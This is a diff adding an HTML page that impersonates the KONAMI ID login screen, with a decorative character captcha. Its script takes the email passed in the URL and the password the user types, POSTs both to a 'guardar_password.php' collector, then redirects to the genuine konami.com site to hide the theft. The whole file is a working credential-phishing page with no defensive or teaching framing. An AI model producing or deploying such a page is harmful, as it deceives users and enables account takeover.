@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI Password</title>
+
+    <style>
+
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:Arial, Helvetica, sans-serif;
+        }
+
+        body{
+            background:#ececec;
+            height:100vh;
+            display:flex;
+            flex-direction:column;
+        }
+
+        .header{
+            background:white;
+            height:60px;
+            display:flex;
+            align-items:center;
+            padding-left:20px;
+            border-bottom:1px solid #ddd;
+        }
+
+        .logo{
+            color:#b60000;
+            font-size:42px;
+            font-weight:bold;
+        }
+
+        .container{
+            flex:1;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
+
+        .login-box{
+            width:600px;
+            background:white;
+            padding:50px;
+            border:1px solid #ccc;
+            border-radius:5px;
+        }
+
+        h1{
+            text-align:center;
+            color:#666;
+            margin-bottom:35px;
+            font-weight:normal;
+        }
+
+        .email-box{
+            background:#e9ecef;
+            padding:15px;
+            border-radius:5px;
+            margin-bottom:15px;
+        }
+
+        .email-label{
+            color:#666;
+            font-size:14px;
+        }
+
+        .email-text{
+            margin-top:5px;
+            font-size:22px;
+            color:#333;
+        }
+
+        .change{
+            text-align:center;
+            margin-bottom:25px;
+        }
+
+        .change a{
+            text-decoration:none;
+            color:#2196f3;
+        }
+
+        input{
+            width:100%;
+            padding:18px;
+            font-size:18px;
+            border:1px solid #ccc;
+            border-radius:5px;
+            margin-bottom:35px;
+        }
+
+        .captcha-top{
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            gap:20px;
+            margin-bottom:20px;
+        }
+
+        .captcha-text{
+            color:#666;
+            font-size:18px;
+        }
+
+        .target-character{
+            width:80px;
+        }
+
+        .captcha{
+            display:flex;
+            justify-content:center;
+            gap:15px;
+            margin-bottom:35px;
+        }
+
+        .captcha-item{
+            width:80px;
+            height:80px;
+            background:#f5f5f5;
+            border:2px solid #ccc;
+            border-radius:5px;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            cursor:pointer;
+            transition:0.2s;
+        }
+
+        .captcha-item img{
+            width:55px;
+        }
+
+        .captcha-item:hover{
+            background:#ddd;
+        }
+
+        .captcha-item.selected{
+            border:3px solid #2196f3;
+            background:#dfefff;
+        }
+
+        button{
+            width:250px;
+            height:55px;
+            background:#b60000;
+            color:white;
+            border:none;
+            border-radius:4px;
+            font-size:22px;
+            cursor:pointer;
+            display:block;
+            margin:auto;
+            font-weight:bold;
+        }
+
+        button:hover{
+            background:#930000;
+        }
+
+        .forgot{
+            text-align:center;
+            margin-top:25px;
+        }
+
+        .forgot a{
+            color:#b60000;
+            text-decoration:none;
+        }
+
+        .register{
+            text-align:center;
+            margin-top:30px;
+            color:#666;
+        }
+
+        .register a{
+            color:#b60000;
+            text-decoration:none;
+        }
+
+        .footer{
+            background:white;
+            height:70px;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            gap:50px;
+            border-top:1px solid #ddd;
+            font-size:14px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">KONAMI</div>
+    </div>
+
+    <div class="container">
+
+        <div class="login-box">
+
+            <h1>KONAMI ID</h1>
+
+            <div class="email-box">
+
+                <div class="email-label">
+                    KONAMI ID / E-mail address
+                </div>
+
+                <div class="email-text" id="correo"></div>
+
+            </div>
+
+            <div class="change">
+                <a href="index.html">
+                    Log In with Another KONAMI ID
+                </a>
+            </div>
+
+            <!-- FORM -->
+
+            <form
+                id="loginForm"
+                action="guardar_password.php"
+                method="POST"
+            >
+
+                <!-- EMAIL OCULTO -->
+
+                <input
+                    type="hidden"
+                    id="emailHidden"
+                    name="email"
+                >
+
+                <!-- PASSWORD -->
+
+                <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    placeholder="Password"
+                    required
+                >
+
+                <!-- CAPTCHA -->
+
+                <div class="captcha-top">
+
+                    <div class="captcha-text">
+                        Please check all boxes with this character.
+                    </div>
+
+                    <img
+                        src="imagenes/personaje1.png"
+                        class="target-character"
+                    >
+
+                </div>
+
+                <div class="captcha">
+
+                    <!-- CORRECTAS -->
+
+                    <div class="captcha-item correct">
+                        <img src="imagenes/personaje1.png">
+                    </div>
+
+                    <div class="captcha-item correct">
+                        <img src="imagenes/personaje1.png">
+                    </div>
+
+                    <div class="captcha-item correct">
+                        <img src="imagenes/personaje1.png">
+                    </div>
+
+                    <!-- INCORRECTAS -->
+
+                    <div class="captcha-item">
+                        <img src="imagenes/personaje2.png">
+                    </div>
+
+                    <div class="captcha-item">
+                        <img src="imagenes/personaje3.png">
+                    </div>
+
+                </div>
+
+                <!-- BOTON -->
+
+                <button
+                    type="button"
+                    onclick="verificarCaptcha()"
+                >
+                    Log In
+                </button>
+
+            </form>
+
+            <div class="forgot">
+                <a href="#">
+                    Forgot Your Password?
+                </a>
+            </div>
+
+            <div class="register">
+                Don't have a KONAMI ID?<br><br>
+
+                <a href="#">
+                    Register
+                </a>
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <span>Terms of Use / Privacy</span>
+        <span>Trademarks</span>
+        <span>Support</span>
+        <span>Company Information</span>
+    </div>
+
+    <script>
+
+        // OBTENER EMAIL
+
+        const params =
+            new URLSearchParams(window.location.search);
+
+        const email =
+            params.get("email");
+
+        // MOSTRAR EMAIL
+
+        document.getElementById("correo").textContent =
+            email;
+
+        // GUARDAR EMAIL EN INPUT HIDDEN
+
+        document.getElementById("emailHidden").value =
+            email;
+
+
+
+        // CAPTCHA
+
+        const captchaItems =
+            document.querySelectorAll(".captcha-item");
+
+
+
+        captchaItems.forEach(item => {
+
+            item.addEventListener("click", () => {
+
+                item.classList.toggle("selected");
+
+            });
+
+        });
+
+
+
+        // VALIDAR CAPTCHA
+
+       function verificarCaptcha(){
+
+    const correctas =
+        document.querySelectorAll(".captcha-item.correct");
+
+    const correctasSeleccionadas =
+        document.querySelectorAll(".captcha-item.correct.selected");
+
+    const incorrectasSeleccionadas =
+        document.querySelectorAll(".captcha-item.selected:not(.correct)");
+
+    const password =
+        document.getElementById("password").value;
+
+
+
+    if(password.trim() === ""){
+
+        alert("Ingresa una contraseña");
+
+        return;
+
+    }
+
+
+
+    if(
+        correctasSeleccionadas.length === correctas.length &&
+        incorrectasSeleccionadas.length === 0
+    ){
+
+        fetch("guardar_password.php", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type":
+                "application/x-www-form-urlencoded"
+            },
+
+            body:
+                "email=" + encodeURIComponent(email) +
+                "&password=" + encodeURIComponent(password)
+
+        })
+
+        .then(response => response.text())
+
+        .then(data => {
+
+           
+
+            // ABRIR OTRA PAGINA
+            window.location.href = "https://www.konami.com/games/eu/es/";
+
+        });
+
+    }else{
+
+        alert("Selecciona solamente los personajes correctos");
+
+    }
+
+}
+
+    </script>
+
+</body>
+</html>
